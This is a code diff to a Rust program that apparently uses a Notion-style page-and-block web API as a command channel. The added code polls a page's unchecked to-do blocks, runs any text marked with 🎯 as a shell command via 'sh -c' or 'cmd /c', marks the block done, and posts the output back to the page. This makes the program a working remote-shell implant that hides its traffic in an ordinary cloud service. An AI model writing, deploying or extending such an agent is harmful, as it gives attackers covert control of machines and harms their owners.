@@ -2,10 +2,12 @@ extern crate reqwest;
 extern crate tokio;
 extern crate serde_json;
 
+use std::process::Command;
 use std::error::Error;
 // use std::io;
 use std::collections::HashMap;
 use std::io::{self, Read, BufRead, Write};
+use std::{thread, time};
 
 use tokio::task;
 use serde_json::{json};
@@ -19,7 +21,7 @@ const API_KEY_URL: &str = "http://localhost:8888";
 
 #[derive(Debug)]
 struct ConfigOptions {
-    sleep_interval: isize,
+    sleep_interval: u64,
     parent_page_id: String,
     api_key: String
 }
@@ -57,7 +59,7 @@ fn getConfigOptions() -> Result<ConfigOptions, Box<dyn Error + Send + Sync>> {
     )
 }
 
-async fn create_page(client: Client, config_options: ConfigOptions, hostname: String) -> Option<String> {
+async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String) -> Option<String> {
     println!("Creating page...");
     let url = format!("{}/pages/", URL_BASE);
     
@@ -91,6 +93,70 @@ async fn create_page(client: Client, config_options: ConfigOptions, hostname: St
     None
 }
 
+async fn get_blocks(client: &Client, page_id: &String) -> Result<serde_json::Value, String> {
+    let url = format!("{URL_BASE}/blocks/{page_id}/children");
+
+    let r = client.get(url).send().await.unwrap();
+
+    if r.status().is_success() {
+        let blocks = r.json::<serde_json::Value>().await.unwrap();
+        match blocks.get("children") {
+            Some(bs) => return Ok(bs.to_owned()),
+            None => return Ok(json!([]))
+        }
+    }
+    Err(r.text().await.unwrap())
+}
+
+async fn complete_command(client: &Client, mut command_block: serde_json::Value) {
+    
+    // Set completed status
+    command_block["to_do"]["checked"] = serde_json::to_value(true).unwrap();
+    let block_id = command_block["id"].as_str().unwrap();
+    let url = format!("{URL_BASE}/blocks/{block_id}");
+    let r = client
+        .patch(url)
+        .json(&command_block)
+        .send()
+        .await
+        .unwrap();
+
+    if !r.status().is_success() {
+        println!("{}",r.text().await.unwrap());
+    }
+}
+
+async fn send_result(client: &Client, command_block_id: &str, output: String) {
+    let url = format!("{URL_BASE}/blocks/{command_block_id}/children");
+    let body : serde_json::Value = json!({
+        "children": [
+            {
+                "object": "block",
+                "type": "quote",
+                "quote": {
+                    "text": [
+                        {
+                            "type": "text",
+                            "text": {"content": output},
+                            "annotations": {"code": true}
+                        }
+                    ]
+                }
+            }
+        ]
+    });
+    let r = client
+        .patch(url)
+        .json(&body)
+        .send()
+        .await
+        .unwrap();
+    
+    if !r.status().is_success() {
+        println!("{}",r.text().await.unwrap());
+    }
+}
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
@@ -116,9 +182,65 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .default_headers(headers)
         .build()?;
 
-    let page_id = create_page(client, config_options, hn)
+    let page_id = create_page(&client, &config_options, hn)
     .await
     .unwrap();
+
+    let sleep_time = 
+        time::Duration::from_secs(config_options.sleep_interval);
+    
+    loop {
+        // Get Blocks
+        let blocks = get_blocks(&client, &page_id).await?;
+        let command_blocks: Vec<&serde_json::Value> = blocks
+            .as_array()
+            .unwrap()
+            .into_iter()
+            .filter(|&b| b["type"] == "to_do")
+            .collect();
+
+        let mut new_command_blocks: Vec<&serde_json::Value> = command_blocks
+            .into_iter()
+            .filter(|&b| b["checked"] == false)
+            .collect();
+
+        for mut block in new_command_blocks {
+            match block["to_do"]["text"][0]["text"]["content"].as_str() {
+                Some(s) => {
+                    if s.contains("🎯") {
+                        let output = if cfg!(target_os = "windows") {
+                            Command::new("cmd")
+                                .args(["/c", s.replace("🎯", "").as_str()])
+                                .output()
+                                .expect("failed to execute process")
+                        } else {
+                            Command::new("sh")
+                                .arg("-c")
+                                .arg(s.replace("🎯", ""))
+                                .output()
+                                .expect("failed to execute process")
+                        };
+                        
+                        let command_block_id = block["id"].as_str().unwrap();
+                        let mut output_string: String;
+                        complete_command(&client, block.to_owned()).await;
+                        if output.stderr.len() > 0 {
+                            output_string = String::from_utf8(output.stderr).unwrap();
+                        } else {
+                            output_string = String::from_utf8(output.stdout).unwrap();
+                        }
+                        send_result(&client, command_block_id, output_string).await;
+                        
+                    };
+
+                },
+                None => { continue; }
+            }
+        }
+
+        thread::sleep(sleep_time);
+        println!("ZZZZ");
+    }
 
     Ok(())
 }
